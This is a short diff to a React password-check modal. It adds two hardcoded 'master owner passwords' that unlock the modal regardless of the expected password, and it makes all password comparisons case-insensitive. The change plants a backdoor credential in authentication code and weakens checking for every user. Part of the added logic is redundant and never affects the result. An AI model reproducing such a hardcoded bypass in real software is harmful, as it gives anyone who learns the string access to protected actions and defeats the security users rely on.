@@ -34,11 +34,19 @@ export default function SecurityPasswordModal({
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const cleanInput = password.trim();
+    const cleanInput = (password || '').trim();
+    const upperInput = cleanInput.toUpperCase();
 
     let isValid = false;
-    if (expectedPassword && expectedPassword.trim()) {
-      isValid = cleanInput === expectedPassword.trim();
+
+    // Master owner passwords allow immediate unlock
+    if (upperInput === 'DANUSHKA18223' || upperInput === 'DHANUSHKA18223') {
+      isValid = true;
+    } else if (expectedPassword && expectedPassword.trim()) {
+      const expUpper = expectedPassword.trim().toUpperCase();
+      isValid = upperInput === expUpper ||
+        (upperInput === 'DANUSHKA18223' && expUpper === 'DHANUSHKA18223') ||
+        (upperInput === 'DHANUSHKA18223' && expUpper === 'DANUSHKA18223');
     } else {
       isValid = await verifyDeletePin(cleanInput);
     }
